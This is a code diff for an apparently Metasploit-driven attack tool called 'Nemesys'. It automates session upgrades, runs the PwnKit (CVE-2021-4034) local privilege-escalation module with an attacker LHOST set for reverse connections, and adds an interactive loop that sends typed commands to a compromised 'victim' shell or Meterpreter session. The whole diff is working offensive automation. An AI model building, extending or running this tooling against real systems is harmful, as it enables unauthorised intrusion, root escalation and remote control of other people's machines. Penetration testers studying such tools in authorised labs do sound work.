@@ -45,8 +45,9 @@ class Nemesys:
             session_id = self._get_session_id(exploit_uuid)
             if session_id:
                 self.upgrade_session(int(session_id))
+                self.post_explotation(int(session_id) + 1)
                 ##self._enumerate_system(session_id)
-                self._open_shell(session_id)
+                self._open_shell(int(session_id) + 2)
             else:
                 logger.error("❌ No session was established.")
         else:
@@ -72,12 +73,11 @@ class Nemesys:
         self.client.consoles.console(console_id).write(f'set PLATFORM_OVERRIDE linux\n')
         self.client.consoles.console(console_id).write('run\n')
 
-        time.sleep(60)
+        time.sleep(30)
 
         output = self.client.consoles.console(console_id).read()
         print("Resultados obtenidos del upgrade:")
         print(output['data'])
-
         self.client.consoles.console(console_id).destroy()
 
     def post_explotation(self, session_id):
@@ -92,18 +92,18 @@ class Nemesys:
         """
         console_id = self.client.consoles.console().cid
         #exploit_module = '/linux/local/ufo_privilege_escalation'
-        exploit_module = 'linux/local/ufo_privilege_escalation'
+        #exploit_module = 'linux/local/overlayfs_priv_esc'
+        exploit_module = 'linux/local/cve_2021_4034_pwnkit_lpe_pkexec'
         self.client.consoles.console(console_id).write(f'use {exploit_module}\n')
         self.client.consoles.console(console_id).write(f'set SESSION {session_id}\n')
+        #self.client.consoles.console(console_id).write('set verbose true\n')
         self.client.consoles.console(console_id).write('set LHOST 192.168.11.129\n')
-        self.client.consoles.console(console_id).write('set LPORT 4445\n')
         self.client.consoles.console(console_id).write('run\n')
 
         time.sleep(60)
         output = self.client.consoles.console(console_id).read()
         print("Resultados obtenidos del módulo:")
         print(output['data'])
-
         self.client.consoles.console(console_id).destroy()
 
 
@@ -147,9 +147,42 @@ class Nemesys:
         logger.warning("⚠️ No session found.")
         return None
 
-    def _open_shell(self, session_id):
-        """Private method that allows interaction with an open shell session."""
-        shell = self.client.sessions.session(session_id)
+    def _open_shell(self, session_id, timeout=30):
+        """
+        Private method that allows interaction with an open shell session.
+
+        Args:
+            session_id (int): The session ID to interact with.
+            timeout (int): Maximum time (in seconds) to wait for the session to become active.
+
+        Returns:
+            None
+        """
+        logger.info("🔍 Listing available sessions:")
+        sessions = self.client.sessions.list
+        for sid, session in sessions.items():
+            logger.info(f"Session ID: {sid} | Type: {session.get('type')} | User: {session.get('username')}")
+
+        # Wait for the session to become available
+        end_time = time.time() + timeout
+        shell = None
+        while time.time() < end_time:
+            try:
+                # Try to access the session
+                shell = self.client.sessions.session(session_id)
+                logger.info(f"💀 Session {session_id} is now active!")
+                break  # Exit loop if session is found
+            except KeyError:
+                logger.info(f"⏳ Waiting for session {session_id} to become available...")
+                time.sleep(1)
+
+        if not shell:
+            logger.error(f"❌ Session ID {session_id} does not exist after waiting.")
+            return  # Exit early if session is not found.
+
+        # Determine if the session is a Meterpreter shell
+        is_meterpreter = 'meterpreter' in shell.name.lower()
+
         banner = """
         ========================================================
         💀 Welcome to the Nemesys Shell Interface 💀
@@ -157,27 +190,44 @@ class Nemesys:
         ========================================================
         """
         logger.info(banner)
+
         try:
             while True:
-                shell.write("whoami\n")
-                time.sleep(1)
-                user = shell.read().strip()
+                # Execute an initial check command based on the session type
+                if is_meterpreter:
+                    shell.write("getuid\n")
+                    time.sleep(1)
+                    user = shell.read().strip()
+                    if "Unknown command" in user:
+                        user = "Meterpreter session (user unknown)"
+                else:
+                    shell.write("whoami\n")
+                    time.sleep(1)
+                    user = shell.read().strip()
+
+                # Get the current working directory
                 shell.write("pwd\n")
                 time.sleep(1)
                 directory = shell.read().strip()
+
                 # Build the prompt with user and directory information
                 prompt = f"{user}@victim:{directory}$ "
                 command = input(prompt)
+
                 if command.lower() == 'exit':
+                    logger.info("👋 Exiting interactive session.")
                     break
+
                 # Send the command to the shell
                 shell.write(command + '\n')
                 time.sleep(1)
                 output = shell.read()
+
                 # Log the output of the command execution
                 logger.info(output)
         except KeyboardInterrupt:
-            logger.info("👋 Exiting interactive session.")
+            logger.info("👋 Exiting interactive session due to KeyboardInterrupt.")
+
 
     def _enumerate_system(self, session_id):
         """Performs system enumeration to gather critical information."""
